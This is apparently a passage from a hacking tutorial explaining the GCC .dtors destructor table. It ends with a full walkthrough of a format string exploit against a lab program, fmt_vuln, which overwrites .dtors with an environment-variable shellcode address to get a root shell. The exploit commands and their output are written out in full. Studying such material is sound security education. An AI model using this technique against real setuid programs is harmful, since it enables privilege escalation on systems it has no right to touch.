In binary programs compiled with the GNU C compiler, special table sections called .dtors and .ctors are made for destructoras  and constructors respectively
Constructor functions are executed before the main() function is executed, and destructor functions are executed just before the main() funcion exits with an exit system call
The destructor functions and the .dtors table section are of a particular interest

A function can be declared as a destructor function by defining the destructor attribute:

dtors_sample.c
__________________________________________________________________________________
#include <stdio.h>
#include <stdlib.h>

static void cleanup(void) __attribute__ ((destructor));

main() {
	printf("Some actions happen in the main() function..\n");
	printf("and then when main exits(), the destructor is called..\n");

	exit(0);
}

void cleanup(void) {
	printf("In the cleanup function now..\n");
}
__________________________________________________________________________________

In the preceding code example, the cleanup() function is defined with the destructor attribute, so the function is automatically called when the main() function exits
__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -o dtors_sample dtors_sample.c
reader@hacking:~/booksrc $ ./dtors_sample
Some actions happen in the main() function..
and then when main() exits, the destructor is called..
In the cleanup() function now..
__________________________________________________________________________________

This behavior of automatically executing a function on exit is controlled by the .dtors table section of the binary
This section is an array of 32-bit addresses terminated by a NULL address
The array always begins with 0xffffffff and ends with the NULL address of 0x00000000
Between these two are the addresses of all the functions that have been declared with the destructor attribute

The nm command can be used to find the address of the cleanup() function, and objdump can be used to examine the sections of the binary
__________________________________________________________________________________
   reader@hacking:~/booksrc $ nm ./dtors_sample
   080495bc d _DYNAMIC
   08049688 d _GLOBAL_OFFSET_TABLE_
   080484e4 R _IO_stdin_used
            w _Jv_RegisterClasses
   080495a8 d __CTOR_END__
   080495a4 d __CTOR_LIST__
(1)080495b4 d __DTOR_END__
(2)080495ac d __DTOR_LIST__
   080485a0 r __FRAME_END__
   080495b8 d __JCR_END__
   080495b8 d __JCR_LIST__
   080496b0 A __bss_start
   080496a4 D __data_start
   08048480 t __do_global_ctors_aux
   08048340 t __do_global_dtors_aux
   080496a8 D __dso_handle
            w __gmon_start__
   08048479 T __i686.get_pc_thunk.bx
   080495a4 d __init_array_end
   080495a4 d __init_array_start
   08048400 T __libc_csu_fini
   08048410 T __libc_csu_init
            U __libc_start_main@@GLIBC_2.0
   080496b0 A _edata
   080496b4 A _end
   080484b0 T _fini
   080484e0 R _fp_hw
   0804827c T _init
   080482f0 T _start
   08048314 t call_gmon_start
-----------------------------
   080483e8 t cleanup
-----------------------------
   080496b0 b completed.1
   080496a4 W data_start
            U exit@@GLIBC_2.0
   08048380 t frame_dummy
   080483b4 T main
   080496ac d p.0
            U printf@@GLIBC_2.0

__________________________________________________________________________________

The nm command shows that the cleanup() function is located at 0x080483e8(marked)
It also reveals that the .dtors section starts at 0x080495ac with __DTOR_LIST__(2) and ends at 0x080495b4 with __DTOR_END__(1)
This means that 0x080495ac should contain 0xffffffff, 0x080495b4 should contain 0x00000000 and the address between them (0x080495b0) should contain the address of the cleanup() function (0x080483e8)

The objdump command shows the actual contents of the .dtors section(marked below), although in a slightly confusing format
The first value of 80495ac is simply showing the address where the .dtors section is located
Then the actual bytes are shown, opposed to DWORDS, which means the bytes are reversed
Bearing this in mind, everything appears to be correct
__________________________________________________________________________________
reader@hacking:~/booksrc $ objdump -s -j .dtors ./dtors_sample

./dtors_sample:        file format elf32-i386

Contents of section .dtors:
80495ac ffffffff e8830408 00000000             ............
__________________________________________________________________________________

An interseting detail about the .dtors section is that it is writable
An object dump of the headers will verify this by showing that the .dtors section isn't labeled READONLY
__________________________________________________________________________________
reader@hacking:~/booksrc $ objdump -h ./dtors_sample

./dtors_sample:        file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn 
  0 .interp       00000013  08048114  08048114  00000114  2**0 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
  1 .note.ABI-tag 00000020  08048128  08048128  00000128  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
  2 .hash         0000002c  08048148  08048148  00000148  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
  3 .dynsym       00000060  08048174  08048174  00000174  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
  4 .dynstr       00000051  080481d4  080481d4  000001d4  2**0 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
  5 .gnu.version  0000000c  08048226  08048226  00000226  2**1 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
  6 .gnu.version_r 00000020  08048234  08048234  00000234  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
  7 .rel.dyn      00000008  08048254  08048254  00000254  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
  8 .rel.plt      00000020  0804825c  0804825c  0000025c  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
  9 .init         00000017  0804827c  0804827c  0000027c  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, CODE 
 10 .plt          00000050  08048294  08048294  00000294  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, CODE 
 11 .text         000001c0  080482f0  080482f0  000002f0  2**4 
                  CONTENTS, ALLOC, LOAD, READONLY, CODE 
 12 .fini         0000001c  080484b0  080484b0  000004b0  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, CODE 
 13 .rodata       000000bf  080484e0  080484e0  000004e0  2**5 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
 14 .eh_frame     00000004  080485a0  080485a0  000005a0  2**2 
                  CONTENTS, ALLOC, LOAD, READONLY, DATA 
 15 .ctors        00000008  080495a4  080495a4  000005a4  2**2 
                  CONTENTS, ALLOC, LOAD, DATA 
 16 .dtors        0000000c  080495ac  080495ac  000005ac  2**2 
                  CONTENTS, ALLOC, LOAD, DATA 
 17 .jcr          00000004  080495b8  080495b8  000005b8  2**2 
                  CONTENTS, ALLOC, LOAD, DATA 
 18 .dynamic      000000c8  080495bc  080495bc  000005bc  2**2 
                  CONTENTS, ALLOC, LOAD, DATA 
 19 .got          00000004  08049684  08049684  00000684  2**2 
                  CONTENTS, ALLOC, LOAD, DATA 
 20 .got.plt      0000001c  08049688  08049688  00000688  2**2 
                  CONTENTS, ALLOC, LOAD, DATA 
 21 .data         0000000c  080496a4  080496a4  000006a4  2**2 
                  CONTENTS, ALLOC, LOAD, DATA 
 22 .bss          00000004  080496b0  080496b0  000006b0  2**2 
                  ALLOC 
 23 .comment      0000012f  00000000  00000000  000006b0  2**0 
                  CONTENTS, READONLY 
 24 .debug_aranges 00000058  00000000  00000000  000007e0  2**3 
                  CONTENTS, READONLY, DEBUGGING 
 25 .debug_pubnames 00000025  00000000  00000000  00000838  2**0 
                  CONTENTS, READONLY, DEBUGGING 
 26 .debug_info   000001ad  00000000  00000000  0000085d  2**0 
                  CONTENTS, READONLY, DEBUGGING 
 27 .debug_abbrev 00000066  00000000  00000000  00000a0a  2**0 
                  CONTENTS, READONLY, DEBUGGING 
 28 .debug_line   0000013d  00000000  00000000  00000a70  2**0 
                  CONTENTS, READONLY, DEBUGGING 
 29 .debug_str    000000bb  00000000  00000000  00000bad  2**0 
                  CONTENTS, READONLY, DEBUGGING 
 30 .debug_ranges 00000048  00000000  00000000  00000c68  2**3 
                  CONTENTS, READONLY, DEBUGGING 
__________________________________________________________________________________

Another interesting detail about the .dtors section is that it is included in all binaries compiled with the GNU C compiler, reagrdless of wheter any function were declared with the destructor attribute
This means that the vulnerable format string program, fmt_vuln.c, must have a .dtors section containing nothing
Inspecting using nm and objdump:
__________________________________________________________________________________
reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR
08049694 d __DTOR_END__
08049690 d __DTOR_LIST__

reader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln

./fmt_vuln:      file format elf32-i386

Contents of section .dtors:
 8049690 ffffffff 00000000                        ........
__________________________________________________________________________________
As this output shows, the distance between __DTOR_LIST__ and __DTOR_END__ is only 4 bytes this time, which means there are no addresses between them
The object dump verifies this
Since the .dtors section is writable, if the address after the 0xffffffff is overwritten with a memory address, the program's execution flow will be directed to that address when the program exits
This will be the address of __DTOR_LIST__ plus 4, which is 0x08049694(which also happens to be the address of __DTOR_END__ in this case)

If the program is suid root, and this address can be overwritten, it will be possible to obtain a root shell
__________________________________________________________________________________
reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln
SHELLCODE will be at 0xbffff9ec
__________________________________________________________________________________

Shellcode can be put into an environment variable, and the address can be predicted as usual
Since the program name lengths of the helper program getenvaddr.c and the vulnerable fmt_vuln.c program differ by 2 bytes, the shellcode will  be located at 0xbffff9ec when fmt_vuln.c is executed
This address simply has to be written into the .dtors section at 0x08049694 (marked below) using the format string format vulnerability
Using the short write method
__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xf9ec - 0xbfff
$2 = 14829
(gdb) quit
reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR
08049694 d __DTOR_END__
08049690 d __DTOR_LIST__
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x96\x04\x08\x94\x96\x04\x08")%49143x%4\$hn%14829x%5\$hn
The right way to print user-controlled input:
????%49143x%4$hn%14829x%5$hn
The wrong way to print user-controlled input:
????



                                                              b7fe75fc
[*] test_val @ 0x08049794 = -72 0xffffffb8
sh-3.2# whoami
root
sh-3.2#
__________________________________________________________________________________

Even though the .dtors section isn't properly terminated with a NULL address of 0x00000000, the shellcode address is still considered to be a destructor function
When the program exits, the shellcode will be called, spawning a root shell